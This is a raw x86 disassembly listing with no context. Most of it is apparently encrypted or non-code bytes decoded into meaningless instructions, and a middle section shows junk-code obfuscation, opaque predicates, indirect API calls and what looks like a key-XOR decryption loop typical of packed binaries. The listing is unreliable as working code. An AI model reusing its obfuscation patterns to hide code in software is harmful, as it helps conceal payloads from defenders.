  404b9a:	and    eax,DWORD PTR [ebx+0x68]
  404b9d:	jge    0x404bfe
  404b9f:	scas   al,BYTE PTR es:[edi]
  404ba0:	push   0x4
  404ba2:	mov    es,edx
  404ba4:	rol    BYTE PTR [ecx],cl
  404ba6:	imul   ebx,DWORD PTR [eax-0xc1bad3a],0xffffff81
  404bad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bae:	dec    eax
  404baf:	cwde   
  404bb0:	xor    DWORD PTR [edi+ebp*1],0xfc87cf9d
  404bb7:	mov    eax,edx
  404bb9:	jmp    0x72fe:0xc0aa9c27
  404bc0:	fld    QWORD PTR ds:0x864495e2
  404bc6:	sti    
  404bc7:	dec    ebp
  404bc8:	retf   0xdb30
  404bcb:	stc    
  404bcc:	fisttp DWORD PTR [edx]
  404bce:	jbe    0x404bef
  404bd0:	loopne 0x404bb6
  404bd2:	jmp    0x6c20:0xcc5cc85
  404bd9:	out    0x8e,eax
  404bdb:	cmp    WORD PTR [eax-0x567bd5a1],dx
  404be2:	cs stos DWORD PTR es:[edi],eax
  404be4:	test   eax,0x4ff2a491
  404be9:	into   
  404bea:	fs stc 
  404bec:	sub    bh,ah
  404bee:	xchg   ebp,ebp
  404bf0:	or     edi,DWORD PTR [esi-0x38]
  404bf3:	adc    al,0x9d
  404bf5:	leave  
  404bf6:	adc    eax,0xba161299
  404bfb:	sub    al,0xda
  404bfd:	dec    eax
  404bfe:	cmp    al,0x4c
  404c00:	sbb    eax,0x1a75c288
  404c05:	hlt    
  404c06:	or     eax,0x3bddd7fc
  404c0b:	mov    es:0xc4b2863f,eax
  404c11:	cld    
  404c12:	jno    0x404c07
  404c14:	inc    BYTE PTR [eax-0x69]
  404c17:	dec    ebx
  404c18:	adc    dl,BYTE PTR [eax-0x7c]
  404c1b:	call   edi
  404c1d:	xor    BYTE PTR [edx],ah
  404c1f:	outs   dx,DWORD PTR ds:[esi]
  404c20:	call   0x6e9a:0x2f39e7d8
  404c27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c28:	add    al,0xbd
  404c2a:	mov    dh,0xcb
  404c2c:	xchg   DWORD PTR [edi-0x6d],eax
  404c2f:	mov    dh,0x6d
  404c31:	jns    0x404c4e
  404c33:	addr16 mov ds:0xb341,eax
  404c37:	add    BYTE PTR [eax+0x5e1e0974],bh
  404c3d:	dec    esp
  404c3e:	xchg   esp,eax
  404c3f:	stos   DWORD PTR es:[edi],eax
  404c40:	sub    BYTE PTR [esi-0x2ee949d2],al
  404c46:	stc    
  404c47:	push   edx
  404c48:	or     eax,0x6180d807
  404c4d:	jl     0x404bff
  404c4f:	pop    esi
  404c50:	es imul ecx,ecx,0x8cecbe8c
  404c57:	(bad)  
  404c58:	xchg   edx,eax
  404c59:	or     BYTE PTR [edx+eiz*8-0x5659c147],ch
  404c60:	push   ss
  404c61:	(bad)  
  404c62:	push   0x42d711a4
  404c67:	fisub  DWORD PTR [ecx+0x49]
  404c6a:	mov    eax,0x1a78a1cc
  404c6f:	icebp  
  404c70:	jle    0x404c14
  404c72:	in     eax,0x95
  404c74:	push   ss
  404c75:	add    eax,0xc304e897
  404c7a:	jbe    0x404cdb
  404c7c:	fild   WORD PTR [ecx+0x5e5bc1c9]
  404c82:	cmc    
  404c83:	cmp    eax,0x37e4679a
  404c88:	jecxz  0x404c87
  404c8a:	mov    ebp,0x3f6c8d8f
  404c8f:	cdq    
  404c90:	push   cs
  404c91:	test   al,0x4f
  404c93:	xor    DWORD PTR [ebp-0x4cf2df70],eax
  404c99:	dec    edx
  404c9a:	ret    0x6ef9
  404c9d:	mov    esi,0x4e09d221
  404ca2:	jno    0x404c56
  404ca4:	pushf  
  404ca5:	dec    ebx
  404ca6:	sub    al,0x9e
  404ca8:	jmp    0x8e38:0x9591c6fd
  404caf:	loop   0x404cc3
  404cb1:	cmp    BYTE PTR [edi+0x54746f5],bh
  404cb7:	mov    ds:0x2bef52f2,eax
  404cbc:	mov    al,ds:0x1b7e3e73
  404cc1:	(bad)  
  404cc2:	fcom   DWORD PTR [edi-0xb76d9e9]
  404cc8:	sbb    ebp,ebx
  404cca:	test   BYTE PTR [ebp+0x233ee0bb],ch
  404cd0:	xchg   ebp,eax
  404cd1:	sbb    DWORD PTR [edx-0x1d],ecx
  404cd4:	xchg   ecx,eax
  404cd5:	int3   
  404cd6:	dec    esi
  404cd7:	es jns 0x404d2e
  404cda:	shr    cl,cl
  404cdc:	mov    esi,0xc770e7cb
  404ce1:	cmp    al,0xb7
  404ce3:	and    eax,0xd04f01ff
  404ce8:	into   
  404ce9:	aaa    
  404cea:	xchg   ecx,eax
  404ceb:	mov    ss,WORD PTR [ebp-0xb]
  404cee:	fcomp  QWORD PTR [esi+0x7c4dacf6]
  404cf4:	ret    
  404cf5:	es or  edx,ecx
  404cf8:	cmp    al,0x94
  404cfa:	pop    es
  404cfb:	inc    eax
  404cfc:	inc    esi
  404cfd:	in     eax,0x98
  404cff:	fidiv  DWORD PTR [esi-0x41]
  404d02:	jbe    0x404c9d
  404d04:	xor    dh,0x16
  404d07:	jp     0x404ce7
  404d09:	inc    eax
  404d0a:	cmp    DWORD PTR [esp+ebp*4-0x38a7858d],edi
  404d11:	inc    edi
  404d12:	or     DWORD PTR [edx],ebx
  404d14:	cmp    edx,ebx
  404d16:	add    edi,DWORD PTR [eax+0x438d996e]
  404d1c:	push   eax
  404d1d:	jnp    0x404d4f
  404d1f:	test   DWORD PTR [edx+0x30ab2932],0xb670d434
  404d29:	inc    esp
  404d2a:	aas    
  404d2b:	fistp  DWORD PTR [eax+0x37]
  404d2e:	xchg   esi,eax
  404d2f:	jns    0x404dac
  404d31:	mov    ch,0x32
  404d33:	aas    
  404d34:	ds dec edi
  404d36:	cdq    
  404d37:	mov    eax,ds:0x1d97673a
  404d3c:	and    al,0x7b
  404d3e:	mov    bh,BYTE PTR [esi-0x6f]
  404d41:	mov    ebp,0x3923a7c5
  404d46:	(bad)  
  404d47:	out    dx,eax
  404d48:	mov    cl,0xe5
  404d4a:	retf   0xdd1c
  404d4d:	test   bh,al
  404d4f:	jb     0x404cd8
  404d51:	popf   
  404d52:	add    eax,0xdb5544ca
  404d57:	mov    ebx,0xd2200285
  404d5c:	cmp    DWORD PTR [eax+0x785d547c],ebx
  404d62:	in     eax,dx
  404d63:	inc    ebx
  404d64:	int3   
  404d65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d66:	ins    BYTE PTR es:[edi],dx
  404d67:	inc    eax
  404d68:	and    BYTE PTR [ebx],0x3
  404d6b:	sub    DWORD PTR [ebp+0x714be118],ebp
  404d71:	subps  xmm1,xmm7
  404d74:	sub    BYTE PTR [edi-0xb],0x15
  404d78:	xchg   edi,eax
  404d79:	sbb    BYTE PTR [ebp-0x4],dh
  404d7c:	fwait
  404d7d:	ss scas al,BYTE PTR es:[edi]
  404d7f:	mov    al,0x1f
  404d81:	push   edx
  404d82:	add    al,0x5b
  404d84:	or     edx,ecx
  404d86:	(bad)  
  404d87:	adc    DWORD PTR [ecx],edx
  404d89:	cmp    cl,dl
  404d8b:	clc    
  404d8c:	xor    ch,BYTE PTR [ebx+0x1ae15ff6]
  404d92:	xor    DWORD PTR [ebp+0x7bed29a4],ecx
  404d98:	cmp    esi,ebx
  404d9a:	test   al,0xc2
  404d9c:	mov    al,ds:0x2a00263f
  404da1:	mov    dl,0x6a
  404da3:	loop   0x404d6e
  404da5:	push   esi
  404da6:	in     al,dx
  404da7:	in     eax,0x8
  404da9:	stc    
  404daa:	inc    edi
  404dab:	push   0xffffffca
  404dad:	imul   eax,eax,0xe2a413e8
  404db3:	sub    ebx,DWORD PTR [esi-0x7e64b716]
  404db9:	ss js  0x404d72
  404dbc:	mov    DWORD PTR [ebp*2-0x2b7b6b9e],edx
  404dc3:	je     0x404db7
  404dc5:	jmp    0x404e46
  404dc7:	pop    edx
  404dc8:	nop
  404dc9:	fs test eax,0x43ce795b
  404dcf:	(bad)  
  404dd1:	stos   BYTE PTR es:[edi],al
  404dd2:	adc    eax,0x6ac1d262
  404dd7:	mov    al,ds:0x7b4c858f
  404ddc:	mov    ah,0x6d
  404dde:	fisttp DWORD PTR ds:0x8b3b8f13
  404de4:	push   ds
  404de5:	test   BYTE PTR [ebx-0x26db6345],ah
  404deb:	ins    DWORD PTR es:[edi],dx
  404dec:	sbb    edi,eax
  404dee:	test   DWORD PTR cs:[edi],esi
  404df1:	mov    ah,0x3a
  404df3:	mov    eax,ds:0x7f9611b5
  404df8:	loopne 0x404dd3
  404dfa:	push   esp
  404dfb:	popa   
  404dfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404dfd:	jns    0x404e1a
  404dff:	mov    dh,0x2a
  404e01:	pop    ds
  404e02:	mov    dh,0x3c
  404e05:	adc    bh,cl
  404e07:	(bad)  
  404e08:	shr    edx,cl
  404e0a:	in     eax,0xb4
  404e0c:	mov    ebp,DWORD PTR [ecx+0x73313645]
  404e12:	mov    esi,0x39848fb8
  404e17:	loop   0x404e07
  404e19:	inc    BYTE PTR [edx]
  404e1b:	(bad)  [edx+0x52]
  404e1e:	aas    
  404e1f:	mov    DWORD PTR [ecx],ebx
  404e21:	mov    BYTE PTR [ebp+0x54],bl
  404e24:	push   edx
  404e25:	les    ebx,FWORD PTR [edi]
  404e27:	arpl   WORD PTR [ebx],dx
  404e29:	ds mov ecx,0x3ab37726
  404e2f:	mov    ebp,0x7fb62d4a
  404e34:	mov    BYTE PTR [ebx-0x5a],bh
  404e37:	mov    al,ds:0xecce6bdf
  404e3c:	mov    BYTE PTR [eax],0xdd
  404e3f:	retf   0x6b7f
  404e42:	sub    BYTE PTR fs:0x9e688767,dl
  404e49:	mov    ax,0x8efe
  404e4d:	cld    
  404e4e:	mov    bh,0xba
  404e50:	call   0x77768683
  404e55:	mov    cl,0x65
  404e57:	push   ss
  404e58:	sbb    BYTE PTR [ecx],bh
  404e5a:	dec    ebx
  404e5b:	in     eax,0x5d
  404e5d:	sub    BYTE PTR [edx+0x2d3fa4e7],dh
  404e63:	cwde   
  404e64:	les    esi,FWORD PTR [edx+0x7a0c7994]
  404e6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e6b:	adc    cl,cl
  404e6d:	or     bl,ch
  404e6f:	xchg   edi,eax
  404e70:	gs push esi
  404e72:	mov    cl,BYTE PTR [edx+0x16]
  404e75:	dec    esi
  404e76:	and    DWORD PTR [edi-0x27f3270e],esp
  404e7c:	xchg   edx,eax
  404e7d:	inc    edi
  404e7e:	icebp  
  404e7f:	dec    esi
  404e80:	push   esp
  404e81:	mov    esp,0x9a954ebe
  404e86:	add    dl,BYTE PTR [esi-0x21]
  404e89:	bound  esi,QWORD PTR [ecx+0x1]
  404e8c:	(bad)  
  404e8d:	xchg   ecx,eax
  404e8e:	sbb    esi,DWORD PTR [eax+0x32dd5ddd]
  404e94:	mov    ds:0xfcb4323c,al
  404e99:	jg     0x404ee0
  404e9b:	mov    ds:0x2be2817a,eax
  404ea0:	ret    
  404ea1:	rcl    BYTE PTR [ecx+0x22db4af],0x35
  404ea8:	mov    eax,ds:0xbec89292
  404ead:	stc    
  404eae:	mov    ebx,DWORD PTR [ecx-0x7f55790]
  404eb4:	stos   DWORD PTR es:[edi],eax
  404eb5:	fistp  DWORD PTR [ebx]
  404eb7:	repz dec edx
  404eb9:	stos   DWORD PTR es:[edi],eax
  404eba:	xchg   BYTE PTR [edx+0x466f9e61],bh
  404ec0:	mov    dh,0xa3
  404ec2:	in     eax,dx
  404ec3:	mov    bh,cl
  404ec5:	jmp    0xee63d941
  404eca:	jge    0x404f27
  404ecc:	retf   0x3e61
  404ecf:	lock int3 
  404ed1:	das    
  404ed2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ed3:	ret    
  404ed4:	and    BYTE PTR [edi-0x4d3f90a6],bh
  404eda:	gs daa 
  404edc:	fdivr  DWORD PTR [ecx-0x4884449f]
  404ee2:	pop    ss
  404ee3:	mov    ah,ah
  404ee5:	ds add al,0x76
  404ee8:	pop    edx
  404ee9:	retf   
  404eea:	fcmovnbe st,st(7)
  404eec:	stos   BYTE PTR es:[edi],al
  404eed:	cld    
  404eee:	xchg   esp,eax
  404eef:	add    eax,0xac2a985b
  404ef4:	mov    bl,0x95
  404ef6:	push   ecx
  404ef7:	and    eax,0x79f6d3f8
  404efc:	aam    0x39
  404efe:	or     ch,BYTE PTR [ebp-0x14de4332]
  404f04:	add    BYTE PTR [esi+0x3ec991c],dh
  404f0a:	fwait
  404f0b:	xor    al,0x11
  404f0d:	xchg   si,ax
  404f0f:	lods   eax,DWORD PTR gs:[esi]
  404f11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f12:	and    DWORD PTR [ebx+0x2d],ecx
  404f15:	ja     0x404e9f
  404f17:	shr    DWORD PTR [ebx-0x67],cl
  404f1a:	cmc    
  404f1b:	out    0xdd,al
  404f1d:	xchg   esi,eax
  404f1e:	fwait
  404f1f:	cmc    
  404f20:	mov    ds:0xbdfdbde,al
  404f25:	out    0xed,eax
  404f27:	cli    
  404f28:	retf   
  404f29:	xor    BYTE PTR [ecx],dl
  404f2b:	xchg   ecx,eax
  404f2c:	or     edx,DWORD PTR [ebp-0x1c]
  404f2f:	sbb    DWORD PTR ds:0x42825b,0x7456
  404f39:	shl    ecx,0x1e
  404f3c:	lea    ecx,[edx+eax*1]
  404f3f:	adc    edx,DWORD PTR ds:0x428267
  404f45:	mov    eax,DWORD PTR [ebx]
  404f47:	or     DWORD PTR ds:0x42837b,edi
  404f4d:	mov    edx,DWORD PTR [ebx+0x4]
  404f50:	mov    DWORD PTR ds:0x428357,0x1480
  404f5a:	shrd   eax,edx,0x2
  404f5e:	adc    DWORD PTR ds:0x428363,0x1a3a
  404f68:	shr    edx,0x2
  404f6b:	cmp    DWORD PTR ds:0x428363,0x0
  404f72:	mov    DWORD PTR ds:0x4282f3,ebx
  404f78:	mov    DWORD PTR ds:0x42836b,0x56b3
  404f82:	mov    DWORD PTR ds:0x42824b,0x1c7d
  404f8c:	jmp    0x405004
  404f91:	mov    DWORD PTR ds:0x42821f,ebx
  404f97:	mov    DWORD PTR ds:0x428257,0x5683
  404fa1:	cmp    DWORD PTR ds:0x428363,0x0
  404fa8:	jg     0x404fd2
  404fae:	push   0x428f
  404fb3:	push   DWORD PTR [ebp-0x14]
  404fb6:	call   DWORD PTR ds:0x428d6c
  404fbc:	and    edx,DWORD PTR ds:0x428303
  404fc2:	sub    DWORD PTR ds:0x42822f,ecx
  404fc8:	or     DWORD PTR ds:0x428223,0xf0b
  404fd2:	adc    DWORD PTR ds:0x42815f,0x4903
  404fdc:	mov    edx,DWORD PTR ds:0x428343
  404fe2:	mov    edx,DWORD PTR [edx]
  404fe4:	add    DWORD PTR ds:0x42814b,edx
  404fea:	xor    edx,edx
  404fec:	xor    edx,DWORD PTR ds:0x428143
  404ff2:	xor    DWORD PTR ds:0x428283,edx
  404ff8:	mov    edx,DWORD PTR ds:0x428257
  404ffe:	add    DWORD PTR ds:0x42837b,edx
  405004:	mov    DWORD PTR [ebp-0x1c],eax
  405007:	mov    eax,ds:0x428283
  40500c:	add    DWORD PTR ds:0x42825b,eax
  405012:	mov    eax,DWORD PTR [ebx]
  405014:	sub    edx,0x532
  40501a:	mov    edx,DWORD PTR [ebx+0x4]
  40501d:	xor    DWORD PTR [ebp-0x1c],edi
  405020:	mov    edx,eax
  405022:	xor    eax,eax
  405024:	add    DWORD PTR ds:0x428363,0x32cc
  40502e:	or     eax,DWORD PTR [ebp-0x1c]
  405031:	sub    DWORD PTR ds:0x42836f,0x1679
  40503b:	shl    edx,0x1e
  40503e:	and    DWORD PTR ds:0x428157,edi
  405044:	imul   eax,ecx
  405047:	mov    ecx,DWORD PTR [ebx]
  405049:	mov    edx,DWORD PTR [ebx+0x4]
  40504c:	shrd   ecx,edx,0x2
  405050:	sbb    DWORD PTR ds:0x42837f,0x5de1
  40505a:	mov    DWORD PTR [ebp-0x1c],ecx
  40505d:	sbb    DWORD PTR ds:0x42826f,0x3a7c
  405067:	mov    ecx,DWORD PTR [ebx]
  405069:	adc    DWORD PTR ds:0x428163,0x428247
  405073:	xor    DWORD PTR [ebp-0x1c],edi
  405076:	shr    edx,0x2
  405079:	adc    DWORD PTR ds:0x42835b,ecx
  40507f:	mov    edx,DWORD PTR [ebx+0x4]
  405082:	mov    edx,ecx
  405084:	xor    ecx,ecx
  405086:	mov    DWORD PTR ds:0x42836b,0x321a
  405090:	or     ecx,DWORD PTR [ebp-0x1c]
  405093:	adc    DWORD PTR ds:0x42825b,0x428367
  40509d:	shl    edx,0x1e
  4050a0:	or     DWORD PTR ds:0x428253,0x428273
  4050aa:	sub    ecx,eax
  4050ac:	mov    eax,DWORD PTR [ebp-0xc]
  4050af:	mov    DWORD PTR ds:0x428227,0x7aa6
  4050b9:	cmp    DWORD PTR [eax],ecx
  4050bb:	not    eax
  4050bd:	mov    eax,DWORD PTR [ebp-0xc]
  4050c0:	mov    DWORD PTR ds:0x42835b,0x460d
  4050ca:	jg     0x405287
  4050d0:	mov    ecx,DWORD PTR [ebp+0x18]
  4050d3:	xor    DWORD PTR ds:0x42836b,edx
  4050d9:	mov    edx,DWORD PTR [ebp+0x1c]
  4050dc:	sbb    DWORD PTR ds:0x428377,0x42821b
  4050e6:	shrd   ecx,edx,0x2
  4050ea:	sbb    DWORD PTR ds:0x428243,0x42822f
  4050f4:	mov    DWORD PTR [ebp-0x1c],ecx
  4050f7:	mov    ecx,DWORD PTR [ebp+0x18]
  4050fa:	xor    DWORD PTR [ebp-0x1c],edi
  4050fd:	or     DWORD PTR ds:0x42827f,0x2ce0
  405107:	shl    ecx,0x1e
  40510a:	xor    ecx,ecx
  40510c:	and    DWORD PTR ds:0x42825f,0x42823b
  405116:	or     ecx,DWORD PTR [ebp-0x1c]
  405119:	shr    edx,0x2
  40511c:	or     DWORD PTR ds:0x428147,ebx
  405122:	mov    edx,DWORD PTR [ebp+0x1c]
  405125:	mov    DWORD PTR [ebp-0x2c],ecx
  405128:	cmp    DWORD PTR ds:0x42836b,0x0
  40512f:	mov    DWORD PTR ds:0x42817b,edx
  405135:	mov    DWORD PTR ds:0x42834b,ecx
  40513b:	not    edx
  40513d:	jmp    0x405212
  405142:	mov    DWORD PTR ds:0x42815b,0x795c
  40514c:	cmp    DWORD PTR ds:0x42836b,0x0
  405153:	ja     0x40517c
  405159:	push   0x427f8c
  40515e:	push   DWORD PTR [ebp-0x24]
  405161:	push   0x6923
  405166:	call   DWORD PTR ds:0x428d94
  40516c:	or     DWORD PTR ds:0x428253,0xa87
  405176:	add    ecx,DWORD PTR ds:0x428387
  40517c:	adc    ecx,DWORD PTR ds:0x42816b
  405182:	xor    DWORD PTR ds:0x42815b,0x1a4f
  40518c:	sbb    DWORD PTR ds:0x42826f,edx
  405192:	cmp    DWORD PTR ds:0x4282cb,0x0
  405199:	mov    DWORD PTR ds:0x4282f7,0x66a6
  4051a3:	mov    DWORD PTR ds:0x4282d7,ecx
  4051a9:	mov    ecx,0x67a4
  4051ae:	jmp    0x405212
  4051b3:	mov    edx,0x2152
  4051b8:	cmp    DWORD PTR ds:0x4282cb,0x0
  4051bf:	jge    0x4051e9
  4051c5:	push   DWORD PTR [ebp-0x28]
  4051c8:	push   DWORD PTR [ebp-0x28]
  4051cb:	call   DWORD PTR ds:0x428d98
  4051d1:	inc    DWORD PTR ds:0x428267
  4051d7:	mov    ecx,DWORD PTR ds:0x4281a7
  4051dd:	mov    edx,DWORD PTR ds:0x4283a7
  4051e3:	sub    ecx,edx
  4051e5:	imul   ecx,DWORD PTR [ecx+edx*1]
  4051e9:	xor    DWORD PTR ds:0x4282cb,0x4a74
  4051f3:	mov    edx,DWORD PTR ds:0x42819f
  4051f9:	mov    edx,DWORD PTR [edx]
  4051fb:	sub    DWORD PTR ds:0x428253,edx
  405201:	mov    edx,DWORD PTR ds:0x4281b7
  405207:	mov    ecx,DWORD PTR ds:0x4283a7
  40520d:	sub    ecx,edx
  40520f:	and    edx,DWORD PTR [edx+ecx*1]
  405212:	mov    ecx,DWORD PTR [ebx]
  405214:	sub    DWORD PTR ds:0x42835f,0x2089
  40521e:	mov    edx,DWORD PTR [ebx+0x4]
  405221:	shrd   ecx,edx,0x2
  405225:	shr    edx,0x2
  405228:	mov    DWORD PTR [ebp-0x1c],ecx
  40522b:	xor    edx,edx
  40522d:	xor    edx,DWORD PTR ds:0x42826f
  405233:	sub    DWORD PTR ds:0x428173,edx
  405239:	mov    ecx,DWORD PTR [ebx]
  40523b:	inc    edx
  40523c:	mov    edx,DWORD PTR [ebx+0x4]
  40523f:	add    DWORD PTR ds:0x42834b,0x35fe
  405249:	xor    DWORD PTR [ebp-0x1c],edi
  40524c:	xor    edx,edx
  40524e:	xor    DWORD PTR ds:0x428157,0x631d
  405258:	or     edx,DWORD PTR [ebp-0x1c]
  40525b:	xor    DWORD PTR ds:0x42825f,0x428163
  405265:	shl    ecx,0x1e
  405268:	and    DWORD PTR ds:0x42837b,0x428247
  405272:	imul   edx,DWORD PTR [ebp-0x2c]
  405276:	add    DWORD PTR ds:0x428373,0x4996
  405280:	sub    DWORD PTR [eax],edx
  405282:	jmp    0x4058d5
  405287:	add    DWORD PTR ds:0x42814b,0x42f2
  405291:	mov    ecx,DWORD PTR [esi]
  405293:	cmp    DWORD PTR ds:0x428283,0x0
  40529a:	mov    DWORD PTR ds:0x428213,0x7c0
  4052a4:	mov    edx,DWORD PTR ds:0x428253
  4052aa:	mov    DWORD PTR ds:0x4282db,0x4c43
  4052b4:	jmp    0x405321
  4052b9:	mov    DWORD PTR ds:0x428383,0x6b40
  4052c3:	mov    DWORD PTR ds:0x42826b,0x2bfd
  4052cd:	cmp    DWORD PTR ds:0x428283,0x0
  4052d4:	jae    0x4052fc
  4052da:	push   0x428049
  4052df:	push   0x1ca9
  4052e4:	call   DWORD PTR ds:0x428d9c
  4052ea:	add    edx,DWORD PTR ds:0x42823b
  4052f0:	adc    edx,0x1702
  4052f6:	add    edx,DWORD PTR ds:0x428163
  4052fc:	and    DWORD PTR ds:0x42816f,0x3bee
  405306:	dec    edx
  405307:	xor    edx,edx
  405309:	or     edx,DWORD PTR ds:0x428247
  40530f:	add    DWORD PTR ds:0x428283,edx
  405315:	mov    edx,DWORD PTR ds:0x42826b
  40531b:	add    DWORD PTR ds:0x428153,edx
  405321:	mov    edx,DWORD PTR [esi+0x4]
  405324:	xor    DWORD PTR ds:0x4282d7,0x42820f
  40532e:	shrd   ecx,edx,0x2
  405332:	mov    DWORD PTR [ebp-0x1c],ecx
  405335:	cmp    DWORD PTR ds:0x4282f3,0x0
  40533c:	mov    DWORD PTR ds:0x4282ef,edi
  405342:	mov    DWORD PTR ds:0x428257,ebx
  405348:	jmp    0x405426
  40534d:	mov    DWORD PTR ds:0x4282fb,0x4d36
  405357:	mov    DWORD PTR ds:0x428377,0x1e95
  405361:	cmp    DWORD PTR ds:0x4282f3,0x0
  405368:	jb     0x405396
  40536e:	push   0x848f
  405373:	push   0x5d21
  405378:	call   DWORD PTR ds:0x428da0
  40537e:	not    ecx
  405380:	adc    DWORD PTR ds:0x42837f,ecx
  405386:	neg    ecx
  405388:	mov    ecx,DWORD PTR ds:0x4283bf
  40538e:	mov    ecx,DWORD PTR [ecx]
  405390:	sub    DWORD PTR ds:0x42835f,ecx
  405396:	mov    ecx,DWORD PTR ds:0x42822f
  40539c:	xor    DWORD PTR ds:0x42813b,ecx
  4053a2:	or     ecx,0x48b0
  4053a8:	sbb    DWORD PTR ds:0x42825b,edx
  4053ae:	cmp    DWORD PTR ds:0x4282db,0x0
  4053b5:	mov    DWORD PTR ds:0x428147,edi
  4053bb:	not    DWORD PTR ds:0x42821b
  4053c1:	jmp    0x405426
  4053c6:	mov    DWORD PTR ds:0x428177,0xab0
  4053d0:	cmp    DWORD PTR ds:0x4282db,0x0
  4053d7:	jb     0x405406
  4053dd:	push   0x56df
  4053e2:	push   DWORD PTR [ebp-0x20]
  4053e5:	push   DWORD PTR [ebp-0x20]
  4053e8:	push   0x14ed
  4053ed:	push   DWORD PTR [ebp-0x24]
  4053f0:	call   DWORD PTR ds:0x428da4
  4053f6:	sub    ecx,DWORD PTR ds:0x42817b
  4053fc:	sub    DWORD PTR ds:0x42821b,0x6432
  405406:	or     DWORD PTR ds:0x42823f,0x3285
  405410:	adc    ecx,DWORD PTR ds:0x42816f
  405416:	sub    DWORD PTR ds:0x428373,edi
  40541c:	mov    DWORD PTR ds:0x42821b,0x48f2
  405426:	mov    ecx,DWORD PTR [esi]
  405428:	xor    DWORD PTR [ebp-0x1c],edi
  40542b:	shl    ecx,0x1e
  40542e:	adc    DWORD PTR ds:0x428257,0xf0c
  405438:	xor    ecx,ecx
  40543a:	xor    DWORD PTR ds:0x4282cf,0x1337
  405444:	or     ecx,DWORD PTR [ebp-0x1c]
  405447:	shr    edx,0x2
  40544a:	mov    edx,DWORD PTR ds:0x42837f
  405450:	sub    edx,DWORD PTR ds:0x428133
  405456:	mov    DWORD PTR ds:0x42837f,edx
  40545c:	jmp    0x40583a
  405461:	xchg   ecx,eax
  405462:	stc    
  405463:	xchg   ebp,eax
  405464:	out    dx,al
  405465:	ins    BYTE PTR es:[edi],dx
  405466:	push   0x6b
  405468:	jbe    0x405493
  40546a:	push   0x25
  40546c:	stos   BYTE PTR es:[edi],al
  40546d:	and    dl,BYTE PTR [edi-0x461995fe]
  405473:	sbb    BYTE PTR [eax],bl
  405475:	sahf   
  405476:	adc    bl,BYTE PTR [eax]
  405478:	sbb    BYTE PTR [edi+0x2828c3e6],dl
  40547e:	or     BYTE PTR [ecx],bh
  405480:	ins    BYTE PTR es:[edi],dx
  405481:	sbb    ebp,ebx
  405483:	shr    BYTE PTR [eax+esi*4+0x59],0xa3
  405488:	bound  ebp,QWORD PTR [esi+0x6]
  40548b:	das    
  40548c:	mov    dh,0x7a
  40548e:	ret    
  40548f:	cld    
  405490:	es imul esi,ecx,0x2952a516
  405497:	(bad)  
  405498:	xor    DWORD PTR [eax-0x5e],eax
  40549b:	rcl    BYTE PTR [eax+ebp*2+0x66],0xad
  4054a0:	adc    eax,0x622e4f57
  4054a5:	jmp    0x3e05ac49
  4054aa:	push   esp
  4054ab:	pop    ecx
  4054ac:	loop   0x405479
  4054ae:	lods   al,BYTE PTR ds:[esi]
  4054af:	fucomip st,st(2)
  4054b1:	outs   dx,DWORD PTR ds:[esi]
  4054b2:	jl     0x40552c
  4054b4:	ds push esi
  4054b6:	das    
  4054b7:	sahf   
  4054b8:	retf   
  4054b9:	mov    dh,bl
  4054bb:	or     eax,0x4035425e
  4054c0:	or     bl,dh
  4054c2:	mov    edx,0xb83c4b9e
  4054c7:	enter  0x8b2c,0xf3
  4054cb:	fs push cs
  4054cd:	push   es
  4054ce:	inc    eax
  4054cf:	xchg   ebp,eax
  4054d0:	push   ss
  4054d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054d2:	leave  
  4054d3:	jnp    0x405482
  4054d5:	dec    ebx
  4054d6:	retf   
  4054d7:	sub    DWORD PTR [ebx+0x6601f60a],eax
  4054dd:	jbe    0x405485
  4054df:	xchg   DWORD PTR [ecx+0x58],ebp
  4054e2:	pop    esi
  4054e3:	ror    BYTE PTR [ecx+0x72],0x14
  4054e7:	daa    
  4054e8:	mov    ebx,0x969380c8
  4054ed:	jle    0x4054b2
  4054ef:	ja     0x40550f
  4054f1:	nop
  4054f2:	xor    cl,0xc7
  4054f5:	scas   al,BYTE PTR es:[edi]
  4054f6:	sahf   
  4054f7:	lods   eax,DWORD PTR ds:[esi]
  4054f8:	cdq    
  4054f9:	dec    eax
  4054fa:	sbb    bl,BYTE PTR [edi]
  4054fc:	inc    eax
  4054fd:	mov    al,ds:0x2ac6de07
  405502:	in     al,0x25
  405504:	fild   WORD PTR [edi+0x72]
  405507:	sti    
  405508:	rol    BYTE PTR [eax+0x5e],0x3c
  40550c:	mov    eax,DWORD PTR [edi+eax*4+0x3d]
  405510:	aad    0xba
  405512:	mov    ecx,0xaf2aa7b4
  405517:	pop    ecx
  405518:	inc    esi
  405519:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40551a:	adc    bl,BYTE PTR [esi+0xd]
  40551d:	loop   0x40550e
  40551f:	and    dh,al
  405521:	bound  esi,QWORD PTR [ebx]
  405523:	push   0x71dcff48
  405528:	jmp    0x96982846
  40552d:	or     DWORD PTR ds:0x14adfb2b,edi
  405533:	pushf  
  405534:	or     esp,edx
  405536:	mov    DWORD PTR [esp+edi*1-0x75988f19],esp
  40553d:	out    dx,eax
  40553e:	int    0x1c
  405540:	ret    
  405541:	xlat   BYTE PTR ds:[ebx]
  405542:	mov    esi,0x366b56e6
  405547:	rol    BYTE PTR [ecx-0x3d48a11],1
  40554d:	or     BYTE PTR [esi-0x6],cl
  405550:	outs   dx,BYTE PTR ds:[esi]
  405551:	dec    eax
  405552:	xor    ebp,DWORD PTR [eax-0x5c06a585]
  405558:	fldcw  WORD PTR [ebx+0x10]
  40555b:	jp     0x4055c4
  40555d:	or     ebx,DWORD PTR [ebp-0x21]
  405560:	xchg   BYTE PTR [edi+0x79],cl
  405563:	mov    ebx,0x2b9bea89
  405568:	cmp    al,0x21
  40556a:	fcmovnb st,st(3)
  40556c:	and    al,0x86
  40556e:	call   0x9e1:0xd5cd22bf
  405575:	xlat   BYTE PTR ds:[ebx]
  405576:	cmp    BYTE PTR ds:0x755f1bbd,ch
  40557c:	sar    DWORD PTR [ecx-0x1a],1
  40557f:	sar    DWORD PTR [eax+0x45],1
  405582:	ds sub edi,edi
